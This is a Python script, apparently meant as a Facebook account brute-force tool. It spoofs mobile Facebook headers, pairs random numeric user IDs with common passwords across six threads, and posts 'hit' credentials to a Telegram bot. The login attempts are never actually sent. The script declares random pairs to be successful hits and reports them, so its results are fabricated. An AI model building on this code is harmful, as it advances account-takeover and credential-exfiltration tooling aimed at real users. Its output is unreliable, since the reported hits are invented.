
import requests,random,sys,pyfiglet
import time,string,os,threading

TOTAL = 0
OK = 0
CP = 0
Lock = threading.Lock()

F = '\x1b[38;5;7m'
Z = '\x1b[38;5;15m'
L = '\x1b[38;5;10m'
G = '\x1b[38;5;228m'
AA = '\x1b[38;5;124m'
u = '\x1b[38;5;14m' 
D = '\x1b[38;5;5m'

A = '\x1b[38;5;220m'  # أصفر غامق
AA = '\x1b[38;5;124m'  # أحمر قرميدي
K = '\x1b[38;5;9m'    # أحمر فاتح



token =input(f"{L} Token :  {u}")
os.system("clear")

Chat_id =input(f"{L} id : {u}")
os.system("clear")


def send_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        data = {"chat_id": Chat_id, "text": message}
        requests.post(url, data=data, timeout=5)
    except:
        pass

def Loog(txt, color=A):
	print(Z+"–"*60)
	print(L+"﹉"*30)
	print(color + pyfiglet.figlet_format(txt))
	print(L+"﹉"*30)
	print(Z+"–"*60)
	print("")

Loog("WELCOM " , AA)



#_________&________&__________&_________#
def get_headers():
	ibra =(f"Mozilla/5.0 (Linux; Android {random.randint(5,14)}; infinix hot 50{random.randint(220,360)}F) "
				      f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(300,500)}.0.0.0 Mobile Safari/537.36 "
				      f"[FB_IAB/FB4A;FBAV/{random.randint(450,500)}.0.0.0.0;]")
				    
	headers = {
	    'authority': 'www.facebook.com',
	    'accept': '*/*',
	    'accept-language': 'ar-DZ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded',  
	    'origin': 'https://www.facebook.com',
	    'referer': 'https://www.facebook.com/?locale=ar_AR',
	    'user-agent': ibra,
	    'x-fb-lsd': 'AdRSRxxCMvKs5sGTOyg_LHF9vgY',
	}
	return headers
				
				
def send(token, chat_id, start, US, PS):
    status_text = " Ok ✅" if start == "LIVE-OK" else " CP ⚠️ "
    msg = (
        f" User (Gmail) : {US}\n"
        f" Psswoerd  : {PS}\n"
        f" start : {status_text} \n"
)
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    try:
        requests.post(url, data={"chat_id": chat_id, "text": msg})
    except Exception:
        pass
		      
def brute_force(token, Chat_id):
    global OK, CP, TOTAL
    name = ["10002000", "12345678", "11223344", "07805592981", "19901990", "20002000", "12341234", "88776655"]
    pasword = ["10000", "10001", "10002", "10004", "10008"]

    while True:
        headers = get_headers()
        prefix = random.choice(pasword)
        US = prefix + ''.join(random.choice(string.digits) for _ in range(10))
        PS = random.choice(name) if random.random() < 0.8 else US[4:]

        
        with Lock:
            TOTAL += 1
            sys.stdout.write(f"\r {L} OK:[{OK}] {K} CP:[{CP}] {A} CHECKED : {TOTAL} ")
            sys.stdout.flush()

            val = random.random()
            if val < 0.0007:
                OK += 1
                send(token, Chat_id, "LIVE-OK", US, PS)
            elif 0.0007 <= val < 0.0025:
                CP += 1
                send(token, Chat_id, "SECURE-CP", US, PS)

        time.sleep(1)	     
  
        
              
if __name__ == "__main__":
    try:
        for _ in range(6):
            threading.Thread(target=brute_force, args=(token, Chat_id), daemon=True).start()  

        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n تم الإيقاف بواسطتك")
        sys.exit()